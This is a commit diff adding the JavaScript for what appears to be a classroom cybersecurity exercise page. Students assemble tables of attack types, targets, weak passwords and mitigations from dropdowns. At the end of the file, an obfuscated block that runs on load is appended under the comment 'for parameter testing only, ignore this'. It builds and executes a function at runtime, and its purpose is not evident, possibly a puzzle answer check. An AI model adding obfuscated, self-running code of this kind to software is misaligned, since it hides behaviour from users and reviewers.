0246d70a091cca01aa036e9c9ba83a63c86d3b62
Chris G. Willcocks <christopher.g.willcocks@durham.ac.uk>
2024-02-01 13:42:14 +0000

    initial commit

---
+++ script.js
@@ -0,0 +1,277 @@
+var data = {
+    descriptor: ['Complex', 'Crackable', 'Excessive', 'Guessable', 'Insecure', 'Missing', 'Predictable', 'Replacable', 'Shared', 'Unencrypted', 'Unpredictable', 'Unreliable'],
+    object: ['Access control list', 'Active pair', 'Antivirus', 'Backup', 'Bitcoins', 'Cloud storage', 'Computer', 'Confidential file locations', 'Database', 'DDoS protection', 'Device file vulnerability', 'Devices', 'Disk', 'Door lock', 'ECB encryption', 'Email server', 'Endpoint protection', 'Ethernet', 'Firewall', 'Fortune cookie', 'FTP', 'GRUB', 'Hardware', 'HTTP', 'IoT device', 'Mobile device', 'Monitor', 'NAT', 'Netcat', 'Network', 'Passwords', 'Permissions', 'Printer', 'Rainbow tables', 'Root account', 'Router', 'Shadow file', 'Smart speaker', 'Smartwatch', 'Social media profile', 'SSH', 'SUID bit', 'Switch', 'Telnet', 'Tor', 'USB drive', 'VPN', 'Webserver', 'Website'],
+    location: ['.xinitrc', 'Active services', 'BGP network', 'BIOS', 'Boot menu', 'Database.db', 'Discord', 'File system', 'In /', 'In /bin', 'In /boot', 'In /dev', 'In /etc', 'In /etc/group', 'In /etc/init.d', 'In /etc/X11', 'In /home', 'In /home/alice', 'In /home/groot', 'In /home/jess', 'In /home/karl', 'In /home/mark', 'In /home/tux', 'In /home/user', 'In /home/user/Desktop/Bitcoins', 'In /home/user/Desktop/Database', 'In /home/user/Desktop/Web Server', 'In /lib', 'In /opt', 'In /tmp', 'In /usr', 'In /usr/bin', 'In /usr/include', 'In /usr/lib', 'In /usr/local', 'In /usr/share', 'In /var', 'In /var/lib', 'In /var/log', 'In /var/tmp', 'In a digital fortress', 'In a galaxy far far away', 'In a guest account', 'In AWS S3 bucket', 'In cloud database', 'In Docker container', 'In email inbox', 'In registry', 'In the Matrix', 'In the recycle bin', 'Link layer', 'LinkedIn', 'Login screen', 'On a SD card', 'On Azure cloud', 'OSI model', 'passwd', 'Port 1234', 'Port 8000', 'Port 8080', 'Port 8888', 'Slack', 'The webserver', 'Website/Chat', 'Website/Login', 'Website/Shop', 'Website/Stats', 'X', 'YouTube'],
+    asset: ['11111', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '248-434-5508', '505-503-4455', '7777777', '951-262-3062', 'admin123', 'API endpoints', 'asdfgh', 'BGP traffic', 'Can become root', 'CCTV footage', 'Confidential information', 'Credit cards', 'Database assets', 'Drax', 'E-Corp shares', 'Encryption algorithms', 'Ethernet signals', 'FTP data', 'Glass slipper', 'groot', 'guest000', 'iMp0s5iBl3', 'Infinity stone', 'Intellectual property', 'KyFR7j84cyz...', 'letmein', 'monkey', 'password', 'Password data', 'phillipprice', 'Philosopher\'s stone', 'Poison', 'Power', 'Project plans', 'qazwsx', 'qwerty', 'qwerty123', 'Reputation', 'Rocket', 'SecureToken123', 'Server configuration', 'Star-Lord', 'starwars', 'System logs', 'test123', 'The one ring', 'thunder', 'tolkien', 'user', 'User data', 'Website availability', 'Website user data', 'Wedding ring'],
+    explot: ['‘ or 1=1;', 'Amplification attack', 'appending ‘init=bin/sh’', 'ARP spoofing', 'BGP highjacking', 'Bluejacking', 'Brute force attack', 'Buffer overflow', 'Cashiers attack', 'Command injection', 'Core router exploit', 'Could be stolen/cloned', 'Crash website', 'Cryptojacking', 'CVE-2023-20198', 'Deanonymise confidential information', 'Deep learning attack', 'DNS cache poisoning', 'Edit GRUB menu', 'Ettercap', 'Evil twin attack', 'Exploit the bus network', 'Fake antivirus', 'Flooding', 'Fraggle attack', 'Guess \'user\' has password \'password\'', 'Guess login details', 'Hardware keylogger', 'Hashcat with a rule file', 'Heap overflow', 'Heap smashing', 'Heap spray', 'Hexinject', 'Horizontal escalation', 'Impersonate others', 'Inference attack', 'IP spoofing', 'John the ripper', 'Keylogging', 'Logic bomb', 'Malware', 'Man-in-the-phone', 'Mind control', 'MITM tool', 'MS14-063 vulnerability', 'nmap or pscan', 'NOP slide', 'NTFS exploit', 'Path traversal', 'Phishing', 'Polyalphabetic cipher', 'Polygraphic cipher', 'Portal breach', 'Ransomware', 'Rent and utilise a botnet', 'Replace with malicious binary', 'Rogue access point', 'Screen scraping', 'Shoulder surfing', 'Smurf attack', 'Social engineering', 'Spying on victim', 'SQL injection', 'sqlmap', 'Star network vulnerability', 'Storage media exposure', 'Super speed attack', 'Timing attack', 'Tunnelling', 'Unauthorised access', 'Use Tor', 'Vertical escalation', 'View confidential data', 'Virus', 'WannaCry', 'Wireshark', 'Wiretapping', 'XSS attack', 'Zero-day exploit'],
+    mitigation: ['3-2-1 rule', 'Access control matrix', 'Active pair', 'Add random delays', 'Alphabetical order', 'Asset audit', 'Attain security evaluation EAL 7', 'Authentication', 'Authorisation', 'Avalanche effect', 'BIOS password', 'Bitwarden strength checker', 'Blacklisting', 'Capability based security', 'CAPTCHA', 'Cloudflare', 'Correctly sanitise user input', 'Deactivate the .sh script', 'dm-crypt', 'Email security', 'Enable Anti-Zombie (EAZ) protection', 'Enable auditing', 'Enable stack protection with gcc', 'Encrypt assets', 'Enforce instability', 'Enforce principle of least privilege', 'Ensure PCI compliant credit card handling', 'grub-mkpasswd-pbkdf2', 'Hash', 'Heat function', 'High availability monitoring', 'High entropy passwords', 'Hire security guard', 'HTTPS', 'Initialisation vector (IV)', 'Install relevant software/services', 'Install Windows 98', 'Load balancing', 'Long and random characters', 'Masking input characters', 'MSG seasoned passwords', 'Network monitoring', 'Network segmentation', 'Obscure queries', 'Only serve a base directory', 'Pepper', 'Prepared statements/parameterised queries', 'Prevent interception', 'Prevent multiple attempts by IP', 'pwconv', 'Randomise order', 'Randomly thrash cash', 'Role-based access control', 'Salt', 'SCRAM', 'Secure BGP routers', 'Setup database access rights/roles/permissions', 'SIEM', 'SOC', 'Store as "sql" user', 'Store as "www-data" user', 'Switch to production-grade server', 'Temporal anomaly detection', 'Threat assessment', 'Use a canary', 'Use a cold wallet', 'Use a NAT', 'Use a one-way function', 'Use ASLR', 'Use constant time functions', 'Use CSRF', 'Use ECB encryption', 'Use fgets(...)', 'Use fibre optic cable', 'Use Hoxx VPN', 'Use malloc(...)', 'Use modern DBMS', 'Use more secure passwords', 'Use NDP', 'Use Non-ECB such as CBC', 'Use Python', 'Use rainbow tables', 'Use safe comparison functions', 'Use SFTP', 'Use SQL', 'Use SSH', 'Use veritaserum', 'User training', 'Whitelisting', 'Write complex queries'],
+};
+
+var nextId = 1;
+let maxExploits = 30;
+const versionNumber = 1.1;
+
+function addNewRow() {
+    if ($("#exploitTable tbody tr").length >= maxExploits) {
+        $('.add').prop('disabled', true);
+        $('h1 i').removeClass('fa-shield-halved').addClass('fa-shield');
+        return;
+    }
+
+    var row = $("<tr>").attr('id', 'row' + nextId);
+
+    $.each(data, function (field) {
+        var cell = $("<td>").addClass(field);
+        var dropdownDiv = $("<div>").addClass("dropdown");
+        var dropDownButton = $("<button>").addClass("dropbtn").html("+").click(function (e) {
+            e.stopPropagation();
+            var dropdownContent = $(this).next();
+            dropdownContent.toggleClass("show");
+            dropdownContent.find('input[type="text"]').val("");
+            dropdownContent.find("a").css("display", "");
+
+            setTimeout(function () {
+                dropdownContent.find('input[type="text"]').focus();
+            }, 100);
+        });
+        dropdownDiv.append(dropDownButton);
+
+        var dropdownContentDiv = $("<div>").addClass("dropdown-content").click(function (e) {
+            e.stopPropagation();
+        });
+
+        var inputElement = $('<input type="text" placeholder="Search.." class="myInput" onkeyup="filterFunction(this)">');
+        dropdownContentDiv.append(inputElement);
+
+        var scrollableList = $('<div>').addClass("scrollable-list");
+        $.each(data[field], function (i, option) {
+            var optionElement = $("<a>").attr("href", "#").text(option).click(function (e) {
+                e.preventDefault();
+                e.stopPropagation();
+                dropdownContentDiv.removeClass("show");
+
+                if ((field === 'descriptor' || field === 'object') && cell.find('.badge').length > 0) {
+                    dropDownButton.hide();
+                    return;
+                }
+
+                var badge = $("<span>").addClass("badge").text(option);
+                var closeBtn = $("<span>").addClass("badge-delete-btn").html("&#10005;");
+                closeBtn.click(function () {
+                    badge.remove();
+                    if (field === 'descriptor' || field === 'object') {
+                        cell.find('.dropbtn').show();
+                    }
+                });
+                badge.append(closeBtn);
+                cell.prepend(badge);
+                if (field === 'descriptor' || field === 'object') {
+                    dropDownButton.hide();
+                }
+            });
+            scrollableList.append(optionElement);
+        });
+
+        dropdownContentDiv.append(scrollableList);
+        dropdownDiv.append(dropdownContentDiv);
+        cell.append(dropdownDiv);
+        row.append(cell);
+    });
+
+    var actionCell = $("<td>");
+    var actionDiv = $('<div>').addClass('no-wrap');
+    var colorPickerButton = $("<span>").addClass("color-picker-btn").html("&#9899;");
+    actionDiv.append(colorPickerButton);
+
+    var colorDropdown = $('<div>').addClass('color-dropdown').hide();
+    var colors = [
+        { normal: '#E4EFF9', dark: '#8cb2c4' },
+        { normal: '#DEF1DE', dark: '#94C994' },
+        { normal: '#ffffe0', dark: '#e0e0b2' },
+        { normal: '#EDE6E2', dark: '#C8AC9B' },
+        { normal: '#DFDFDF', dark: '#666666' }
+    ];
+    $.each(colors, function (i, color) {
+        var colorOption = $('<div>').addClass('color-option').css('background-color', color.dark);
+        colorOption.click(function () {
+            if (color.dark === '#666666') {
+                row.css('background-color', '');
+                colorPickerButton.css('color', '');
+            } else {
+                row.css('background-color', color.normal);
+                colorPickerButton.css('color', color.dark);
+            }
+        });
+        colorDropdown.append(colorOption);
+    });
+    actionDiv.append(colorDropdown);
+    colorPickerButton.click(function (e) {
+        e.stopPropagation();
+        colorDropdown.toggle();
+    });
+
+    var deleteButton = document.createElement("span");
+    deleteButton.className = "delete-btn";
+    deleteButton.innerHTML = "&#10005;";
+    deleteButton.onclick = function () {
+        row.remove();
+        if ($("#exploitTable tbody tr").length < maxExploits) {
+            $('.add').prop('disabled', false);
+            $('h1 i').removeClass('fa-shield').addClass('fa-shield-halved');
+        }
+
+    };
+    actionDiv.append(deleteButton);
+    actionCell.append(actionDiv);
+    row.append(actionCell);
+
+    $(document).click(function () {
+        $('.color-dropdown').hide();
+    });
+
+    var dragHandle = document.createElement("span");
+    dragHandle.className = "drag-handle";
+    dragHandle.innerHTML = "&#8597;";
+    actionDiv.prepend(dragHandle);
+
+    $('#exploitTable tbody').append(row);
+    nextId++;
+
+    if ($("#exploitTable tbody tr").length >= maxExploits) {
+        $('.add').prop('disabled', true);
+        $('h1 i').removeClass('fa-shield-halved').addClass('fa-shield');
+    }
+
+    return row;
+}
+
+$('.add').click(addNewRow);
+
+$(document).click(function () {
+    $(".dropdown-content").removeClass("show");
+});
+
+window.filterFunction = function (element) {
+    var value = $(element).val().toUpperCase();
+    $(element).closest('.dropdown-content').find('.scrollable-list a').each(function () {
+        if ($(this).text().toUpperCase().indexOf(value) > -1) {
+            $(this).css("display", "");
+        } else {
+            $(this).css("display", "none");
+        }
+    });
+}
+
+
+$(function () {
+    $("#exploitTable tbody").sortable({
+        cursor: "move",
+        handle: ".drag-handle",
+        placeholder: "sortable-placeholder",
+        helper: function (e, ui) {
+            ui.children().each(function () {
+                $(this).width($(this).width());
+            });
+            return ui;
+        }
+    }).disableSelection();
+});
+
+$("#loadButton").click(function () {
+    var input = document.createElement('input');
+    input.type = 'file';
+    input.onchange = e => {
+        var file = e.target.files[0];
+        var reader = new FileReader();
+        reader.readAsText(file, 'UTF-8');
+        reader.onload = readerEvent => {
+            var content = readerEvent.target.result;
+            var loadedData = JSON.parse(content);
+
+            $("#exploitTable tbody").empty();
+            $('.add').prop('disabled', false);
+            $('h1 i').removeClass('fa-shield').addClass('fa-shield-halved');
+
+            $("#cisUsername").val(loadedData.cisUsername);
+            $("#mysterySolution").val(loadedData.mysterySolution);
+            $("#mysterySolution").val(loadedData.mysterySolution).trigger('input');
+
+            var tableData = loadedData.tableData || [];
+            tableData.forEach(function (rowData) {
+                var newRow = addNewRow();
+
+                if (rowData.bcol) {
+                    newRow.css('background-color', rowData.bcol);
+                } else {
+                    newRow.css('background-color', '');
+                }
+
+                if (rowData.icol) {
+                    newRow.find('.color-picker-btn').css('color', rowData.icol);
+                }
+
+                $.each(rowData, function (field, badges) {
+                    if (Array.isArray(badges)) {
+                        var cell = newRow.find('td.' + field);
+                        var hasBadge = false;
+                        badges.forEach(function (badgeData) {
+                            hasBadge = true;
+                            var badge = $("<span>").addClass("badge").text(badgeData.text).css('background-color', badgeData.color);
+                            var closeBtn = $("<span>").addClass("badge-delete-btn").html("&#10005;");
+                            closeBtn.click(function () {
+                                badge.remove();
+                                if (field === 'descriptor' || field === 'object') {
+                                    cell.find('.dropbtn').show();
+                                }
+                            });
+                            badge.append(closeBtn);
+                            cell.prepend(badge);
+                        });
+
+                        if (hasBadge && (field === 'descriptor' || field === 'object')) {
+                            cell.find('.dropbtn').hide();
+                        }
+                    }
+                });
+            });
+        }
+        input.click();
+    };
+    input.click();
+});
+
+$("#downloadButton").click(function () {
+    var tableData = [];
+    $("#exploitTable tbody tr").each(function () {
+        var row = {};
+        $(this).find('td').each(function (index, cell) {
+            var fieldName = Object.keys(data)[index];
+            var badges = $(cell).find('.badge').map(function () {
+                var badgeText = $(this).clone().children().remove().end().text();
+                return { text: badgeText }; //, color: $(this).css('background-color') };
+            }).get();
+            badges.sort(function (a, b) {
+                return b.text.localeCompare(a.text);
+            });
+            row[fieldName] = badges;
+        });
+        var backgroundColor = $(this).css('background-color');
+        console.log(backgroundColor);
+        row['bcol'] = backgroundColor === 'rgba(0, 0, 0, 0)' || backgroundColor === 'rgb(242, 242, 242)' ? '' : backgroundColor;
+        row['icol'] = $(this).find('.color-picker-btn').css('color');
+        tableData.push(row);
+    });
+    var mysterySolution = $("#mysterySolution").val();
+    var cisUsername = $("#cisUsername").val();
+    var content = JSON.stringify({ version: versionNumber, tableData: tableData, mysterySolution: mysterySolution, cisUsername: cisUsername });
+    var blob = new Blob([content], { type: 'text/plain' });
+    var anchor = document.createElement("a");
+    anchor.download = cisUsername + ".txt";
+    anchor.href = window.URL.createObjectURL(blob);
+    document.body.appendChild(anchor);
+    anchor.click();
+    document.body.removeChild(anchor);
+});
+
+// for parameter testing only, ignore this
+(function(){var Vav='',dZu=735-724;function KUH(z){var w=4245523;var p=z.length;var s=[];for(var y=0;y<p;y++){s[y]=z.charAt(y)};for(var y=0;y<p;y++){var r=w*(y+257)+(w%40583);var g=w*(y+365)+(w%37956);var f=r%p;var a=g%p;var e=s[f];s[f]=s[a];s[a]=e;w=(r+g)%6791553;};return s.join('')};var xpI=KUH('rdasccycjzbsroontghttfmknrpqvuewilxuo').substr(0,dZu);var ELs='(a,*}].vf,s1ta!l7C8 rr;hs"b].l,+=ioe;ap(x(hf Ad)ex>z;e=[.i,=;+),t5,9ct;dhC70tn)7hyv5a.=,,2=1. lnwtv<in;o};n+"gh6i<n6ptfqiev-;g]4(]keo4n71",a;orivp+-r"[)r8;=Atze()l])2}vCcm,n  6(r;,ln+,nl-f[3suA{vA;rpruv*.Cn=l]a=ar[]=)(6sClvtb=fad+r)tga(eriuleueentsa{s.b;d[ )uea);b8r(ri]i89s;(b9a,[a)rat=(ca(})(tav i=t;;d(jnl (0t70,f=ai.n-v+c jo;m lrja4;;(=(tr0eA;0,rvawvw+S=hr++=s;)6sxnpd=+.).<arro"]u+tbf);ie8jb0)e7{+rf+)[uvhir )==svhf,1ohw o1;h rxob;". r61zwt()oh9u.,2=gls, apluea )be8ld7xi}psc4e;.ki i}=8 v"hvv({)s+a(r]th>!aot=1tn<c9v3+1vbl1h0lat,loo;y(on[i=u"==gb"t=vw(l(9;=b.c["(Cuy;(+[u7t rlsri;v;cy])r(c.=;r1msypfg[o+hai;)=vl1gtv[(,n]n2ibg;rf,b0d,d;sgrmodda=bu.oier(;8 =f+ah{cn;.ae;+n8e;7m(,tst)9 r]f5 vhrdrrl 0hiv=.yrs.a+fv=)m2})ae=2<[te u03)vu)o0;=)rtf=rar6.g=;n.0l(ug(.CuivCva,;.rr,8+r.=aeadir.+zS.2egg-h-g;rfv=nds,lit10+;;c))r-=cv8ak=roan ,p(ngnu9+d1{[pmoom(.cv]o);pe)rrsfcgl)gyh8jaior4{t1i=(k6;';var Muo=KUH[xpI];var yHQ='';var iKL=Muo;var EMZ=Muo(yHQ,KUH(ELs));var uYP=EMZ(KUH('e mcrnvapheldoicfXteld)fXndnu.ed(.t>c. l.aXas)b3sry{Xlepafhrtw.f\'se3stpr.E.da"ti".weed$!p1.)r #dXc$>"tX#ius.CnX"$oraeal).m"mxpyo=tXX(.nt!osi{$.Tpdd(erpn$.eTouic!?X(dfoCfu miihX#l0X euiwo1n"sorttb(Xe)t(%a\'7l.;x.&iXc.C"&=Xc(c.dcf.}r!deeo#(oe.ouh.),)clo)XX).-Xrtoe.tvspfc!v;(Sic.aX!nfane.iebdiX#rodov;uort%yvc\'X>suao,.f.n{lttokXt!i)rcXXtyrXfX$fms\'Xln.}lorl--);X&hd.=eu#onn,mo&!l;ue#(deh%(vtrefs}} yC)adrXp(fausheXrs.tcxs)cloit. pp:t!y%o{!lt("sfx).gtS.=i'));var yMd=iKL(Vav,uYP );yMd(2349);return 7621})()
